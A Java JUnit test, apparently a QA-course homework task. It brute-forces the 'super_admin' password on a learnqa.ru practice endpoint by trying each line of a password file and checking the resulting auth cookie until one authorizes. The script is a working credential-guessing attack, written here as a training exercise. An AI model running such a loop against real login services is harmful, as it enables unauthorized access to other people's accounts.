import io.restassured.RestAssured;
import io.restassured.response.Response;
import org.junit.jupiter.api.Test;
import java.util.ArrayList;
import java.util.List;
import java.io.*;
import java.util.Scanner;



public class GetPasswordTest {

    @Test
    public void testGetPassword() throws IOException {
        /*
Бесконечный цикл
         */
        FileReader fw = new FileReader("data/passwords_for_GethasswordTest.txt");
        Scanner scan = new Scanner(fw);

        List<String> pwdList = new ArrayList<>();
        while (scan.hasNextLine()) {
            pwdList.add(scan.nextLine());
        }
        fw.close();

        int j = 0;
        while (j < pwdList.size()){
            String new_pwd = pwdList.get(j);
            Response createTask = RestAssured
                .given()
                .when()
                .queryParam("login","super_admin")
                .queryParam("password",new_pwd)
                .get("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
                .andReturn();

        String cookie = createTask.getCookie("auth_cookie");

        Response AutorizeStatus =RestAssured
                .given()
                .when()
                .cookie("auth_cookie",cookie)
                .get("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
                .andReturn();
        String status =AutorizeStatus.asString();
        if (status.equals("You are NOT authorized")){
            j++;
        }
        else {
           System.out.println(new_pwd +" "+status);
           break;
        }

        }
    }
}
